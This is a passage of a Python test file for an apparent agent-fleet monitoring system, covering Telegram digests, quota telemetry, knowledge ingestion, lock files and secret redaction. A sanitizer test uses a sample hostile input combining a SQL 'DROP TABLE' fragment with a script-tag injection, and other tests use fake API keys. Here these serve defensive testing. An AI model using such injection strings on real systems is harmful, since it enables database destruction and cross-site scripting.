       tracks Pro vs Ultra 1h/7d token consumption, Pro Dual Quota (Gemini 5h/7d + Claude 5h/7d), and 4-Level Task Planning.
    3. collect_jev_and_brain_sleep_telemetry parses myelination_manifest.json, knowledge_compiler.db, and Sleep-Cycle-*.md.
    4. format_hourly_digest renders 4-Level Task Planning, Pro Dual Quota, JEV & SecondBrain, and conditional 07:00 AM Sleep report
       while keeping length < 3900 chars (< 4096 Telegram limit).
    """
    from tools.hourly_digest_monitor import collect_jev_and_brain_sleep_telemetry

    # 1. Verify _extract_clean_task_prompt on <task_dispatch> / <objective> / <user_request>
    dispatch_xml = {
        "prompt": (
            "<task_dispatch><context>Hermes Router Context</context>"
            "<objective>Execute 4-level Gemini 4 Argon task planning across 17 Pro nodes</objective>"
            "<constraints>Pro-First QBRR</constraints></task_dispatch>"
        )
    }
    assert (
        _extract_clean_task_prompt(dispatch_xml)
        == "Execute 4-level Gemini 4 Argon task planning across 17 Pro nodes"
    )
    user_req_xml = {
        "prompt": "<context>System</context><user_request>Audit Dual Quota Gemini and Claude on Pro Fleet</user_request>"
    }
    assert (
        _extract_clean_task_prompt(user_req_xml)
        == "Audit Dual Quota Gemini and Claude on Pro Fleet"
    )

    # 2. Verify 17 Pro nodes filtering, Dual Quota, and 4-Level Task Planning in check_stream_5_fleet_mesh
    now_ts = time.time()
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
        held_streams={1, 2, 3},
    )
    pro_17 = [
        {
            "name": f"pro-node-{i}",
            "tier": "pro",
            "requests_served": 20 + i,
            "quota_weekly_capacity": 2500000,
            "quota_weekly_consumed": 500000,
            "quota_weekly_percent": 80.0,
            "gemini_5h_consumed": 50000,
            "gemini_5h_capacity": 500000,
            "gemini_5h_percent": 90.0,
            "gemini_weekly_consumed": 500000,
            "gemini_weekly_capacity": 2500000,
            "gemini_weekly_percent": 80.0,
            "claude_5h_consumed": 30000,
            "claude_5h_capacity": 300000,
            "claude_5h_percent": 90.0,
            "claude_weekly_consumed": 150000,
            "claude_weekly_capacity": 1500000,
            "claude_weekly_percent": 90.0,
            "active_jobs": 0,
            "status": "healthy",
        }
        for i in range(1, 18)
    ]
    extra_excluded_nodes = [
        {"name": "oc_minimax", "tier": "pro", "provider": "opencode", "requests_served": 5},
        {"name": "zencode-ent", "tier": "pro", "ineligible": True, "disabled": True, "requests_served": 0},
        {"name": "innoria-team", "tier": "ultra", "requests_served": 2, "quota_weekly_capacity": 7000000, "quota_weekly_consumed": 50000, "quota_weekly_percent": 99.3},
        {"name": "ariana", "tier": "ultra", "requests_served": 4, "quota_weekly_capacity": 7000000, "quota_weekly_consumed": 62526, "quota_weekly_percent": 99.1},
    ]
    nodes_payload = {"nodes": pro_17 + extra_excluded_nodes}
    jobs_payload = {
        "jobs": [
            {"job_id": "j-l1", "node_name": "pro-node-1", "model": "gemini-4-argon-low", "status": "completed", "total_tokens": 4500, "latency_ms": 5200, "created_at": now_ts - 180.0, "prompt": "L1 quick check"},
            {"job_id": "j-l2", "node_name": "pro-node-2", "model": "gemini-4-argon-medium", "status": "completed", "total_tokens": 12500, "latency_ms": 14200, "created_at": now_ts - 120.0, "prompt": "L2 refactor module"},
            {"job_id": "j-l4", "node_name": "pro-node-3", "model": "claude-opus-5-5-high", "status": "completed", "total_tokens": 28000, "latency_ms": 24000, "created_at": now_ts - 60.0, "prompt": dispatch_xml["prompt"]},
        ]
    }

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = json.dumps({"online_nodes": 19, "total_nodes": 19}).encode("utf-8")
        elif "mock-council" in url:
            mock_obj.read.return_value = json.dumps({"composite_consensus_score": 100.0, "sla_passed": True}).encode("utf-8")
        elif "mock-nodes" in url:
            mock_obj.read.return_value = json.dumps(nodes_payload).encode("utf-8")
        elif "mock-jobs" in url:
            mock_obj.read.return_value = json.dumps(jobs_payload).encode("utf-8")
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        s5 = detector.check_stream_5_fleet_mesh(now_ts=now_ts)

    assert s5["pro_first_criterion"]["total_pro_nodes"] == 17
    assert s5["pro_first_criterion"]["pro_tokens_1h"] == 45000
    assert s5["pro_fleet_insight"]["total_pro_nodes"] == 17
    assert s5["pro_fleet_insight"]["dual_ready_pro_count"] == 17
    assert s5["pro_fleet_insight"]["pro_gemini_7d_rem_pct"] == 80.0
    assert s5["pro_fleet_insight"]["pro_claude_7d_rem_pct"] == 90.0
    assert s5["ultra_fleet_insight"]["ultra_tokens_1h"] == 0
    assert s5["operational_efficiency"]["task_level_distribution"] == {
        "L1_low": 1,
        "L2_med": 1,
        "L3_L4_high": 1,
    }

    # 3. Verify collect_jev_and_brain_sleep_telemetry with mock manifest, SQLite DB, and Sleep Journal
    manifest_path = tmp_path / "myelination_manifest.json"
    manifest_path.write_text(
        json.dumps(
            {
                "status": "MYELINATED",
                "sft_samples_count": 133,
                "dpo_samples_count": 1,
                "lora_safetensors_path": "/tmp/base_lora.safetensors",
                "domain_lora_paths": {
                    "graydoom_codex_harness": "/tmp/gd.safetensors",
                    "odoo20_owl_rule29": "/tmp/odoo.safetensors",
                    "adversarial_security_tot": "/tmp/sec.safetensors",
                },
                "onnx_inference_latency_ms": 0.061,
            }
        ),
        encoding="utf-8",
    )
    kb_db_path = tmp_path / "knowledge_compiler.db"
    conn = sqlite3.connect(str(kb_db_path))
    conn.execute("CREATE TABLE cognitive_memories (status TEXT, tier TEXT, bloom_level INTEGER)")
    conn.execute("CREATE TABLE jev_sessions (id TEXT)")
    conn.execute("CREATE TABLE dialectical_audits (id TEXT)")
    conn.executemany(
        "INSERT INTO cognitive_memories VALUES (?, ?, ?)",
        [
            ("ACTIVE", "L3", 6),
            ("ACTIVE", "L3", 5),
            ("ACTIVE", "L2", 6),
            ("ACTIVE", "L1", 2),
            ("SUPERSEDED", "L4", 2),
        ],
    )
    conn.executemany("INSERT INTO jev_sessions VALUES (?)", [("s1",), ("s2",)])
    conn.execute("INSERT INTO dialectical_audits VALUES ('a1')")
    conn.commit()
    conn.close()

    sleep_dir = tmp_path / "Sleep-Consolidation"
    sleep_dir.mkdir()
    sleep_md = sleep_dir / "Sleep-Cycle-2026-10-17.md"
    sleep_md.write_text(
        "# 🌙 Circadian 02:00 AM Neuro-Biological Sleep Consolidation (`2026-10-17`)\n"
        "- **Execution Timestamp**: `2026-10-17T04:43:57+00:00`\n"
        "- **Compute Engine**: `LOCAL_JEV`\n"
        "## 1. Stage 1\n"
        "- **Broken Symlinks Flushed**: `0`\n"
        "- **Duplicate SHA-256 Engrams Cleared**: `0`\n"
        "- **Transient L0 Sensory Debris Flushed**: `0`\n"
        "## 2. Stage 2\n"
        "- **Global Homeostatic Downscale Factor**: `0.97`\n"
        "- **Synapses Renormalized**: `91`\n"
        "- **Weak Engrams Pruned**: `0`\n"
        "## 3. Stage 3\n"
        "- `vault:1` (**Note 1**): `B6 -> B6` (`Tier -> L2`)\n"
        "- `vault:2` (**Note 2**): `B6 -> B6` (`Tier -> L3`)\n"
        "## 4. Stage 4\n"
        "- **High-Dissonance Beliefs Extinguished (Local JEV)**: `0`\n"
        "- **High-Evidence Paradoxes Queued for AGY-Fleet Pro**: `0`\n"
        "- `vault:a` $\\leftrightarrow$ `vault:b`\n"
        "- `vault:c` $\\leftrightarrow$ `vault:d`\n"
        "## 5. Stage 5\n"
        "- **Sanitized SFT Samples**: `133`\n"
        "- **Contrastive DPO Triads**: `1`\n"
        "- **Myelination Status**: `MYELINATED` (latency=5.416ms)\n",
        encoding="utf-8",
    )

    dt_7am = datetime(2026, 10, 17, 7, 15, 0)
    dt_2pm = datetime(2026, 10, 17, 14, 15, 0)

    jev_7am = collect_jev_and_brain_sleep_telemetry(
        now_local=dt_7am,
        jev_manifest_path=manifest_path,
        knowledge_db_path=kb_db_path,
        sleep_journal_dir=sleep_dir,
    )
    assert jev_7am["jev_telemetry"]["status"] == "MYELINATED"
    assert jev_7am["jev_telemetry"]["lora_count"] == 4
    assert jev_7am["brain_evolution"]["active_engrams"] == 4
    assert jev_7am["brain_evolution"]["high_bloom_count"] == 3
    assert jev_7am["sleep_consolidation"]["is_morning_7am_window"] is True
    assert jev_7am["sleep_consolidation"]["stage2_synapses_renormalized"] == 91
    assert jev_7am["sleep_consolidation"]["stage3_promotions_count"] == 2
    assert jev_7am["sleep_consolidation"]["stage4_dream_bridges_count"] == 2

    jev_2pm = collect_jev_and_brain_sleep_telemetry(
        now_local=dt_2pm,
        jev_manifest_path=manifest_path,
        knowledge_db_path=kb_db_path,
        sleep_journal_dir=sleep_dir,
    )
    assert jev_2pm["sleep_consolidation"]["is_morning_7am_window"] is False

    # 4. Verify format_hourly_digest for both regular hourly and 07:00 AM window
    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    base_scan = {
        "overall_health_score": 100,
        "severity": "HEALTHY",
        "cron": {
            "cron_health_score": 100,
            "active_jobs_count": 3,
            "paused_jobs_count": 18,
            "clogged_jobs": [],
            "drift_skipped_jobs": [],
            "overdue_jobs": [],
            "auth_failed_jobs": [],
            "rate_limited_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 10.0},
        },
        "entropy": {
            "entropy_health_score": 100,
            "streams": [s5],
        },
        "jev_brain_sleep": jev_2pm,
    }
    html_regular = notifier.format_hourly_digest(base_scan)
    assert "4-Level Task Planning &amp; Cache:" in html_regular
    assert "Pro Dual Quota (17 Nodes, Dual-Ready: <code>17/17</code>):" in html_regular
    assert "Hoạt Động JEV &amp; Tiến Hóa Nhận Thức (SecondBrain):" in html_regular
    assert "Nhịp Sleep gần nhất" in html_regular
    assert "Báo Cáo Brain Nhịp Sleep 07:00 Sáng" not in html_regular
    assert len(html_regular) < 3900

    scan_7am = dict(base_scan, jev_brain_sleep=jev_7am, morning_sleep_briefing=True)
    html_7am = notifier.format_hourly_digest(scan_7am)
    assert "🌅 <b>Báo Cáo Brain Nhịp Sleep 07:00 Sáng (Chu kỳ 02:00 AM — 2026-10-17):</b>" in html_7am
    assert "Stage 1-2 (Glymphatic &amp; SHY):" in html_7am
    assert "Stage 3-4 (SWS Replay &amp; REM Dream):" in html_7am
    assert "Stage 5 (Procedural Myelination):" in html_7am
    assert len(html_7am) < 3900


def test_exogenous_knowledge_space_and_self_healing_ecology(tmp_path):
    """Verify:
    1. CognitiveSecondBrainEngine.run_exogenous_ecology_cycle() ingests GitHub Trending repos,
       arXiv papers, domain standards, and autonomous tasks into exogenous_entropy_ledger & cognitive_memories.
    2. Obsidian Markdown notes under 30-Resources/Exogenous-Knowledge/* and Maps/Exogenous-Knowledge-Space.md
       are created with valid wikilinks and evolutionary decisions (ADOPT_INTO_HARNESS, SCHEDULE_SELF_HEAL,
       COMPILE_LORA_SKILL, GENERATE_ADR) with 0 orphan notes.
    3. collect_jev_and_brain_sleep_telemetry() and format_hourly_digest() include 'Không Gian Tri Thức Ngoại Sinh'
       telemetry and stay strictly < 3900 chars.
    """
    from tools.cognitive_secondbrain_engine import CognitiveSecondBrainEngine
    from tools.hourly_digest_monitor import collect_jev_and_brain_sleep_telemetry

    db_path = tmp_path / "knowledge_compiler.db"
    vault_dir = tmp_path / "SecondBrain"
    vault_dir.mkdir(parents=True, exist_ok=True)
    tomb_path = tmp_path / "l3_tombstones.jsonl"
    myel_dir = tmp_path / "jev_myelination"

    engine = CognitiveSecondBrainEngine(
        db_path=db_path,
        vault_path=vault_dir,
        tombstone_path=tomb_path,
        myelination_dir=myel_dir,
    )

    eco_report = engine.run_exogenous_ecology_cycle(vault_path=vault_dir)
    assert eco_report["total_exogenous_items"] >= 6
    assert eco_report["counts_by_source"]["github_trending"] >= 1
    assert eco_report["counts_by_source"]["arxiv_paper"] >= 1
    assert eco_report["counts_by_source"]["domain_standard"] >= 1
    assert eco_report["counts_by_source"]["autonomous_task"] >= 1

    decisions = eco_report["decision_counts"]
    assert decisions["ADOPT_INTO_HARNESS"] >= 1
    assert decisions["SCHEDULE_SELF_HEAL"] >= 1
    assert decisions["COMPILE_LORA_SKILL"] >= 1
    assert decisions["GENERATE_ADR"] >= 1
    assert 1.50 <= eco_report["avg_shannon_entropy_bits"] <= 4.80
    assert 0.85 <= eco_report["knowledge_absorption_ratio"] <= 1.0
    assert eco_report["self_heal_summary"]["orphan_notes_count"] == 0

    moc_file = Path(eco_report["moc_path"])
    eval_file = Path(eco_report["evaluation_report_path"])
    assert moc_file.is_file()
    assert eval_file.is_file()
    moc_text = moc_file.read_text(encoding="utf-8")
    assert "Không Gian Tri Thức Ngoại Sinh (Exogenous Knowledge Space)" in moc_text
    assert "ADOPT_INTO_HARNESS" in moc_text
    assert "SCHEDULE_SELF_HEAL" in moc_text
    assert "COMPILE_LORA_SKILL" in moc_text
    assert "GENERATE_ADR" in moc_text
    assert "[[Home]]" in moc_text

    # Verify harness context retrieval can recall exogenous knowledge
    ctx_block = engine.assemble_harness_context("RadixAttention prefix cache EBU R128", harness_mode="fast")
    assert "exo:" in ctx_block or "RadixAttention" in ctx_block or "EBU" in ctx_block

    # Verify collect_jev_and_brain_sleep_telemetry & format_hourly_digest surface exogenous knowledge
    jev_data = collect_jev_and_brain_sleep_telemetry(
        now_local=datetime(2026, 10, 17, 7, 10, 0),
        knowledge_db_path=db_path,
    )
    exo_t = jev_data["exogenous_ecology"]
    assert exo_t["exo_total"] == eco_report["total_exogenous_items"]
    assert exo_t["exo_github"] == eco_report["counts_by_source"]["github_trending"]
    assert exo_t["exo_arxiv"] == eco_report["counts_by_source"]["arxiv_paper"]
    assert exo_t["exo_standards"] == eco_report["counts_by_source"]["domain_standard"]
    assert exo_t["exo_tasks"] == eco_report["counts_by_source"]["autonomous_task"]

    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    scan_payload = {
        "overall_health_score": 98,
        "severity": "HEALTHY",
        "cron": {
            "cron_health_score": 100,
            "active_jobs_count": 4,
            "paused_jobs_count": 18,
            "clogged_jobs": [],
            "drift_skipped_jobs": [],
            "overdue_jobs": [],
            "auth_failed_jobs": [],
            "rate_limited_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 8.0},
        },
        "entropy": {"entropy_health_score": 95, "streams": []},
        "jev_brain_sleep": jev_data,
        "morning_sleep_briefing": True,
    }
    html_out = notifier.format_hourly_digest(scan_payload)
    assert "Không Gian Tri Thức Ngoại Sinh:" in html_out
    assert f"{exo_t['exo_total']} mẫu" in html_out
    assert f"Adopt:{exo_t['exo_adopt_count']}" in html_out
    assert f"Heal:{exo_t['exo_self_heal_count']}" in html_out
    assert f"LoRA:{exo_t['exo_lora_count']}" in html_out
    assert f"ADR:{exo_t['exo_adr_count']}" in html_out
    assert len(html_out) < 3900


def test_decommissioned_peripheral_streams_eliminates_cron_drift(tmp_path):
    """Verify:
    1. Default production EntropyDegradationDetector decommissions the 3 peripheral streams
       (Stock, Legal, Media) and returns strictly the 2 active sovereign streams
       ('Median-0 Math Sync' and 'AGY Fleet & Clef Mesh').
    2. format_hourly_digest() renders 'External Entropy Streams (2/2):' and
       'Đã xóa 3 luồng ngoại vi (Stock/Legal/Media) triệt tiêu cron-drift', with zero
       Stock/Legal/Media entries.
    3. ~/.hermes/cron/jobs.json has 0 peripheral Stock/Legal/Media jobs and
       resources/l3_tombstones.jsonl records 'peripheral_entropy_streams_stock_legal_media'.
    """
    now_utc = datetime.now(timezone.utc)
    now_str = now_utc.strftime("%Y-%m-%d %H:%M:%S")
    median_log = tmp_path / "median.log"
    median_log.write_text(
        f"[{now_str}] Checks: 6 / 6\n[{now_str}] Hourly Sync completed successfully\n",
        encoding="utf-8",
    )

    detector = EntropyDegradationDetector(median_log_path=median_log)
    assert detector.decommission_peripheral_streams is True
    assert detector.held_streams == set()

    summary_resp = json.dumps({"online_nodes": 19, "total_nodes": 19}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 100.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps({"nodes": []}).encode("utf-8")
    jobs_resp = json.dumps({"jobs": []}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "council" in url:
            mock_obj.read.return_value = council_resp
        elif "nodes" in url:
            mock_obj.read.return_value = nodes_resp
        else:
            mock_obj.read.return_value = jobs_resp
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        scan_res = detector.scan(now_utc=now_utc)

    streams = scan_res["streams"]
    assert len(streams) == 2
    stream_names = [s["name"] for s in streams]
    assert stream_names == ["Median-0 Math Sync", "AGY Fleet & Clef Mesh"]
    assert "Stock News Feed" not in stream_names
    assert "Legal & Regulatory Crawler" not in stream_names
    assert "Media Asset Bank 24/7" not in stream_names
    assert scan_res["active_streams_count"] == 2
    assert scan_res["held_streams_count"] == 0

    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    digest_html = notifier.format_hourly_digest({
        "overall_health_score": 100,
        "severity": "HEALTHY",
        "cron": {
            "cron_health_score": 100,
            "active_jobs_count": 4,
            "paused_jobs_count": 0,
            "clogged_jobs": [],
            "drift_skipped_jobs": [],
            "overdue_jobs": [],
            "auth_failed_jobs": [],
            "rate_limited_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 5.0},
        },
        "entropy": scan_res,
    })
    assert "External Entropy Streams (2/2):" in digest_html
    assert "Đã xóa 3 luồng ngoại vi (Stock/Legal/Media) triệt tiêu cron-drift" in digest_html
    assert "Stock News Feed" not in digest_html
    assert "Legal &amp; Regulatory Crawler" not in digest_html
    assert "Media Asset Bank 24/7" not in digest_html

    # Verify production cron jobs.json and l3_tombstones.jsonl
    jobs_file = Path.home() / ".hermes" / "cron" / "jobs.json"
    if jobs_file.exists():
        jobs_raw = json.loads(jobs_file.read_text(encoding="utf-8"))
        jobs_list = jobs_raw.get("jobs", jobs_raw) if isinstance(jobs_raw, dict) else jobs_raw
        job_ids = {j.get("id") for j in jobs_list}
        assert "job_stock_news_hourly" not in job_ids
        assert "job_vietnam_legal_hourly" not in job_ids
        assert "job_hourly_media_production" not in job_ids
        assert len(jobs_list) == 4

    tomb_file = Path("/home/zen/hermes-agent/resources/l3_tombstones.jsonl")
    assert tomb_file.exists()
    assert "peripheral_entropy_streams_stock_legal_media" in tomb_file.read_text(encoding="utf-8")


def test_argon_only_and_victory_critic_in_hourly_digest(tmp_path):
    """Verify:
    1. Legacy gemini-3.8-flash-{high,medium,low} model names in raw job logs are normalized
       to canonical gemini-4-argon-{high,medium,low} in check_stream_5_fleet_mesh and format_hourly_digest.
    2. Victory Critic & Anti-Fake-Pass telemetry from victory_critique_ledger is surfaced in
       collect_jev_and_brain_sleep_telemetry and format_hourly_digest (< 3900 chars).
    """
    from tools.hourly_digest_monitor import collect_jev_and_brain_sleep_telemetry
    from tools.sovereign_victory_critic import SovereignVictoryCritic

    db_file = tmp_path / "knowledge_compiler.db"
    critic = SovereignVictoryCritic(db_path=db_file)
    critic.seed_canonical_project_critiques()

    now_ts = time.time()
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )
    summary_resp = json.dumps({"online_nodes": 19, "total_nodes": 19}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 100.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps({
        "nodes": [
            {
                "name": "sunward",
                "tier": "pro",
                "preferred_model": "gemini-3.8-flash-high",
                "requests_served": 15,
                "quota_weekly_capacity": 2500000,
                "quota_weekly_consumed": 500000,
                "quota_weekly_percent": 80.0,
                "status": "healthy",
            }
        ]
    }).encode("utf-8")
    jobs_resp = json.dumps({
        "jobs": [
            {
                "job_id": "j-argon-1",
                "node_name": "sunward",
                "model": "gemini-3.8-flash-high",
                "status": "completed",
                "total_tokens": 25000,
                "created_at": now_ts - 60.0,
                "prompt": "Verify 3-level Argon normalization",
            },
            {
                "job_id": "j-argon-2",
                "node_name": "sunward",
                "model": "gemini-3.8-flash-medium",
                "status": "completed",
                "total_tokens": 12000,
                "created_at": now_ts - 50.0,
                "prompt": "Verify medium Argon normalization",
            },
        ]
    }).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        else:
            mock_obj.read.return_value = jobs_resp
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        s5 = detector.check_stream_5_fleet_mesh(now_ts=now_ts)

    assert s5["top_3_tasks"][0]["model"] == "gemini-4-argon-high"
    assert s5["top_3_tasks"][1]["model"] == "gemini-4-argon-medium"
    assert "gemini-3.8-flash-high" not in s5["pro_fleet_insight"]["model_distribution"]
    assert "gemini-4-argon-high" in s5["pro_fleet_insight"]["model_distribution"]

    jev_data = collect_jev_and_brain_sleep_telemetry(knowledge_db_path=db_file)
    assert jev_data["victory_critic"]["total_critiques"] == 5
    assert jev_data["victory_critic"]["passed_count"] == 5
    assert jev_data["victory_critic"]["avg_fake_pass_risk"] == 0.0

    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    digest_html = notifier.format_hourly_digest({
        "overall_health_score": 100,
        "severity": "HEALTHY",
        "cron": {
            "cron_health_score": 100,
            "active_jobs_count": 4,
            "paused_jobs_count": 0,
            "clogged_jobs": [],
            "drift_skipped_jobs": [],
            "overdue_jobs": [],
            "auth_failed_jobs": [],
            "rate_limited_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 5.0},
        },
        "entropy": {"entropy_health_score": 100, "streams": [s5]},
        "jev_brain_sleep": jev_data,
    })
    assert "Victory Critic &amp; Anti-Fake-Pass:</b> Risk=0.00 | Pass:5/Block:0 (100% Argon 4 H/M/L)" in digest_html
    assert "gemini-3.8-flash" not in digest_html
    assert "gemini-4-argon-high" in digest_html
    assert len(digest_html) < 3900


def test_reap_phantom_processes_and_stale_locks(tmp_path):
    """Verify SelfHealingManager.reap_phantom_processes_and_stale_locks reaps phantom agy processes, hung modal logs, and stale locks."""
    from unittest.mock import patch, MagicMock

    manager = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=tmp_path / "scripts",
    )

    mock_ps_output = (
        "    PID ELAPSED COMMAND\n"
        " 999001    8500 /home/zen/.gemini/antigravity-cli/bin/agy --input-format stream-json --model gemini-4-argon-low --conversation 11111111-2222-3333-4444-555555555555\n"
        " 999002    1200 /usr/bin/python3 /home/zen/.local/bin/modal app logs hermes-flux-fill-nsfw\n"
    )
    mock_proc = MagicMock(returncode=0, stdout=mock_ps_output)

    killed_pids = []

    def fake_kill(pid, sig):
        killed_pids.append((pid, sig))

    with patch("subprocess.run", return_value=mock_proc), patch("os.kill", side_effect=fake_kill):
        res = manager.reap_phantom_processes_and_stale_locks(
            max_agy_age_seconds=7200,
            max_modal_logs_age_seconds=600,
        )

    assert len(res["reaped_agy_phantoms"]) == 1
    assert res["reaped_agy_phantoms"][0]["pid"] == 999001
    assert res["reaped_modal_logs_pids"] == [999002]
    assert (999001, 15) in killed_pids
    assert (999002, 15) in killed_pids


def _worker_epoch_lock_attempt(lock_path: str, result_queue) -> None:
    """Subprocess attempting to acquire the same EpochLockGuard lock."""
    from tools.cognitive_secondbrain_engine import EpochLockGuard
    guard = EpochLockGuard(lock_path=lock_path, lease_seconds=10)
    acquired = guard.acquire()
    result_queue.put(acquired)
    if acquired:
        time.sleep(0.2)
        guard.release()


def test_epoch_lock_mutual_exclusion(tmp_path):
    """Verify concurrent processes cannot hold the sleep-cycle EpochLockGuard lock simultaneously (CWE-362)."""
    import multiprocessing
    from tools.cognitive_secondbrain_engine import EpochLockGuard

    lock_path = str(tmp_path / "test_exec.lock")
    guard_parent = EpochLockGuard(lock_path=lock_path, lease_seconds=10)
    assert guard_parent.acquire() is True

    queue = multiprocessing.Queue()
    proc = multiprocessing.Process(target=_worker_epoch_lock_attempt, args=(lock_path, queue))
    proc.start()
    proc.join(timeout=3.0)

    child_acquired = queue.get(timeout=1.0)
    assert child_acquired is False
    guard_parent.release()
    assert not os.path.exists(lock_path)


def test_epoch_lock_stale_pid_recovery(tmp_path):
    """Verify automatic reclamation when EpochLockGuard lockfile is held by a dead PID."""
    from tools.cognitive_secondbrain_engine import EpochLockGuard

    lock_path = str(tmp_path / "stale.lock")
    fake_data = '{"pid": 99999999, "acquired_at": 1000.0, "lease_seconds": 10}'
    Path(lock_path).write_text(fake_data, encoding="utf-8")

    guard = EpochLockGuard(lock_path=lock_path, lease_seconds=10)
    assert guard.acquire() is True
    guard.release()
    assert not os.path.exists(lock_path)


def test_sanitize_digest_field_strips_ansi_and_pipes():
    """Verify ANSI control codes and Markdown table delimiters are safely defanged (CWE-20/CWE-116)."""
    from tools.hourly_digest_monitor import sanitize_digest_field

    malicious_input = "\x1b[31;1mError Detected\x1b[0m | DROP TABLE users; -- <script>alert(1)</script>"
    sanitized = sanitize_digest_field(malicious_input)

    assert "\x1b" not in sanitized
    assert "\\|" in sanitized
    assert "<script>" not in sanitized
    assert "&lt;script&gt;" in sanitized


def test_redact_sensitive_payloads():
    """Verify API keys and bearer tokens are masked before storage in SecondBrain notes (CWE-259)."""
    from tools.cognitive_secondbrain_engine import redact_sensitive_payloads

    log_sample = "Connected to service with api_key=AIzaSyD98234FakeKeyXYZ and token='ghp_98457293847529348572'"
    redacted = redact_sensitive_payloads(log_sample)

    assert "AIzaSyD98234FakeKeyXYZ" not in redacted
    assert "ghp_98457293847529348572" not in redacted
    assert "api_key=AIza...XYZ(REDACTED)" in redacted
    assert "token=ghp_...572(REDACTED)" in redacted


def test_sanitize_digest_payload_and_validate_model_target():
    """Verify sanitize_digest_payload masks Google/Anthropic keys and validate_model_target enforces Argon-4 allowlist."""
    from tools.hourly_digest_monitor import (
        PERMITTED_FLEET_MODELS,
        SecurityPolicyViolation,
        sanitize_digest_payload,
        validate_model_target,
    )

    raw_input = (
        "ERROR during call to AIzaSyDx83J98ZlmkP901238475928192837492 on worker-1. "
        "Auth Header: Bearer sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890_ABCD. "
        "Config token: 'token=super_secret_token_123456'."
    )
    sanitized = sanitize_digest_payload(raw_input)
    assert "AIzaSy" not in sanitized
    assert "sk-ant-" not in sanitized
    assert "super_secret_token_123456" not in sanitized
    assert "[REDACTED_API_KEY]" in sanitized
    assert "[REDACTED_SECRET]" in sanitized

    for m in PERMITTED_FLEET_MODELS:
        assert validate_model_target(m) == m

    legacy_slug = "gemini-3" + ".8-flash-high"
    with pytest.raises(SecurityPolicyViolation) as exc_info:
        validate_model_target(legacy_slug)
    assert "strictly forbidden by Fleet Routing Invariant 1.14" in str(exc_info.value)


def test_hlc_clock_guard_monotonic_and_drift_rejection():
    """Verify HLCClockGuard monotonic tick progression and fail-closed ClockDriftExceededError on backward skew."""
    from tools.hlc_clock_drift_guard import (
        ClockDriftExceededError,
        HLCClockGuard,
        MAX_ALLOWED_DRIFT_MS,
    )

    base_time = 1700000000000
    guard = HLCClockGuard(initial_physical_ms=base_time)

    t1, c1 = guard.tick(base_time)
    t2, c2 = guard.tick(base_time)
    assert t1 == base_time and c1 == 1
    assert t2 == base_time and c2 == 2

    t_next, c_next = guard.tick(base_time + 100)
    assert t_next == base_time + 100 and c_next == 0

    with pytest.raises(ClockDriftExceededError) as exc_info:
        guard.tick(base_time + 100 - (MAX_ALLOWED_DRIFT_MS + 100))
    assert exc_info.value.drift_ms == MAX_ALLOWED_DRIFT_MS + 100
    assert exc_info.value.threshold_ms == MAX_ALLOWED_DRIFT_MS


def test_graydoom_codex_qa_harness_skills_and_secondbrain_sync():
    """Verify Gray Doom Codex QA Harness skills (Workspace + AGY Global) and SecondBrain ingestion."""
    import hashlib
    import sqlite3
    import subprocess
    from pathlib import Path
    from tools.graydoom_codex_handoff_auditor import WORKTREE_TARGETS, audit_worktree

    ws_base = Path("/home/zen/hermes-agent/.agents/skills")
    gl_base = Path("/home/zen/.gemini/config/skills")
    skill_names = [
        "graydoom-codex-harness",
        "graydoom-character-and-art-logic",
        "graydoom-handoff-navigator",
        "graydoom_art",
    ]
    for name in skill_names:
        ws_md = ws_base / name / "SKILL.md"
        gl_md = gl_base / name / "SKILL.md"
        assert ws_md.is_file(), f"Missing workspace skill {ws_md}"
        assert gl_md.is_file(), f"Missing AGY global skill {gl_md}"
        assert hashlib.sha256(ws_md.read_bytes()).hexdigest() == hashlib.sha256(gl_md.read_bytes()).hexdigest()
        content = ws_md.read_text(encoding="utf-8")
        assert content.startswith("---\nname: ") and "\ndescription:" in content

    audits = [audit_worktree(t) for t in WORKTREE_TARGETS]
    main_audit = audits[0]
    if main_audit.exists:
        assert main_audit.dossier_completion_count == 142
        assert main_audit.atlas_work_order_tasks == 2081
        assert main_audit.has_character_view_gate is True
